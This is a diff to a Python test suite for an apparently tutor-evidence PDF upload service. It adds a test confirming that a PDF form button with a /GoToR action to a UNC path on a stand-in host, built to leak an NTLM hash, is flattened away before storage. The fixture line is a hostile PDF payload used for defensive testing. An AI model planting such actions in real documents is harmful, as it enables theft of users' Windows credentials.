@@ -39,6 +39,8 @@ from lemely.web.routers.tutor_evidence import get_tutor_evidence_repo
 from tests.sandbox_fixtures import in_process_sandbox, sandboxed  # noqa: F401
 from tests.storage_fakes import FakeStorageBackend
 from tests.test_evidence_files import (
+    assert_inert_pdf,
+    pdf_with_action,
     pdf_with_open_action_and_attachments,
     pdf_with_scripted_widget,
 )
@@ -161,6 +163,25 @@ def test_t6_stores_a_pdf_under_a_server_path_and_returns_201(
         assert gone not in stored, gone
     assert _pages(stored) == 1
     assert body["sizeBytes"] == row.size_bytes == len(stored)
+
+
+def test_t6_stores_a_form_pdf_flattened_with_no_action_left(
+    client: TestClient, sm: sessionmaker[Session], storage: FakeStorageBackend
+) -> None:
+    """F30-3: a button that would leak an NTLM hash (``/GoToR`` to a UNC path) is not stored."""
+    _tutor(client, sm)
+    uploaded = pdf_with_action("widget", r"<</S/GoToR/F(\\\\evidence-host\\share\\cv.pdf)>>")
+    assert b"/GoToR" in uploaded
+
+    response = _upload(client, uploaded, filename="certificate.pdf")
+
+    assert response.status_code == 201, response.text
+    [row] = _rows(sm)
+    stored = _objects(storage)[(evidence_bucket(), row.storage_path)]
+    assert_inert_pdf(stored)
+    assert b"evidence-host" not in stored
+    assert _pages(stored) == 1
+    assert row.size_bytes == len(stored)
 
 
 def test_t6_sniffed_type_and_reencode_decide_what_is_stored(
